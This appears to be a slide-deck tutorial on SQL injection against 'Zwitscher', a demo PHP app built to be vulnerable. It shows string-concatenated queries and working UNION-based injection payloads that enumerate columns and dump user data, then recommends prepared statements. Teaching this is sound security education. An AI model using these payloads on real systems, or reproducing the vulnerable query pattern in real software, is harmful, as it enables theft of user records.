# SQL injections for fun ~~and profit~~

---

## SQL

- **S**tructured **Q**uery **L**anguage
- Language to query databases
- Often used in web applications
- LAMP ( Linux / Apache / MySQL / PHP )

---

## Example queries

- [SELECT ... FROM ...](http://www.w3schools.com/sql/sql_select.asp) - Select data from database
- [WHERE](http://www.w3schools.com/sql/sql_where.asp) - Optional: Allows to formulate conditions

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia';
```

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia' OR hashtag = '#cat';
```

```sql
SELECT user FROM zwitscher WHERE message = 'Things always end well.';
```

---

## Dynamic queries with PHP

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
$q = mysql_query($sql);
```

[Run code](../zwitscher/)

<br />
<br />

<span style="color:red">Bad code! Don't do this!</span>

---

## Dynamic queries with PHP
- Input is neither validated nor escaped!
- What happens when the user enters malicious input?
<br />
<br />
<span style="color:red">Bad code! Don't do this!</span>

---

## Query 1

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Input: <span style="color:crimson">#cat</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
```

[Run code](../zwitscher/?search=%23cat)

---

## Query 2

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Input: <span style="color:crimson">#cat' OR hashtag = '#trivia</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
```

[Run code](../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia)

---

## Query 3

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Input: <span style="color:crimson">#dog' OR '1'='1</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
```

[Run code](../zwitscher/?search=%23dog%27+OR+%271%27%3D%271)

---

## What did we learn so far?

- Obvious: User can change the keyword
- Unwanted: Attacker can manipulate the query

<br />
<br />
<br />

### How bad is this anyway? Should I care?

---

# Yes, you should care!

- Attacker can login without password
- Attacker is not limited to current table
- SQL allows to 'concatenate' two query result tables with [UNION](http://www.w3schools.com/sql/sql_union.asp)

---

## More about Zwitscher

- [Zwitscher](../zwitscher/) has a table for its users
- We know its name as well as the names of its columns
<br />
<br />
- Table name: *user*
- Column names: *username*, *mail*, *password*, *age*
<br />
<br />

**Approach: Join a 'normal' message query result with an additional query against the table *user***

---

## First try

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```
---
Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user';
```

[Run code](../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user)

<div style="text-align: left"><i>"SQL Error: You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1."</i></div>
<div style="text-align: left"><i>"Syntax Error: There is an interfering quotation mark."</i></div>

---

## Second try

Task: Get rid of interfering characters by commenting them out

--

## Second try

Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user; --</span>

( **Important:** Space after delimiter )

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';
```

[Run code](../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+)

<div style="text-align: left"><i>"SQL Error: The used SELECT statements have a different number of columns."</i></div>

<div style="text-align: left">UNION requires the same number of fields in both result tables</div>

---

## What now?

- How many fields are there in the first query?
- We don't know :(

<br />
<br />
<br />

### Are we stuck?   

---

## What now? Brutforce!

- "1" returns a table with one field and one column, containing '1'
- "1, 2" returns a table with one column and two fields, '1' and '2'
- "1, 2, 3" returns ...
<br />
<br />

**Approach: Bruteforce... Increment until there is a match**

--

## What now? Brutforce!

Input: <span style="color:crimson">#dog' UNION SELECT 1; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
```

[Run code](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)

:(

--

## What now? Brutforce!

Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>

```php
$sql = "SELECT * 
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
```

[Run code](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)

:(

--

## What now? Brutforce!

Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
```

[Run code](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)

:)

---

## Third Try

- How many columns are in the result of the first query?
- Three columns!
- Select three columns: *username*, *mail*, *age*
<br />
<br />

Input: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';
```

[Run code](../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+)

Bingo!

---

## Recap

- Different tables can be read

- There are problems:

    - Table names unknown
    - Field names unknown

<br />
<br />
<br />

### What now?

---

## Getting table and column names

- Metadata available in [information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- Mostly in:
    - [information_schema.tables](https://dev.mysql.com/doc/refman/8.0/en/tables-table.html)
    - [information_schema.columns](https://dev.mysql.com/doc/refman/8.0/en/columns-table.html)
<br />
<br />
<br />

### How do we get them? Same way as before!

---

## How to avoid this problem?

- Don't trust user input
- Don't build your queries by concatenating strings
- Use safe methods for database interaction
- In PHP: Prepared statements

---

## Let's do it!

There is a third table on [Zwitscher](../zwitscher/)...
<br />
<br />

**Can you dump it?**

---

## Links
- [Pentestmonkey Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Exploiting Filtered SQLi](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections)
- [Filter Evasion Cheat Sheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
- [Wikipedia (English)](http://en.wikipedia.org/wiki/SQL_injection)
- [Source Code of Zwitscher](../zwitscher/?src)
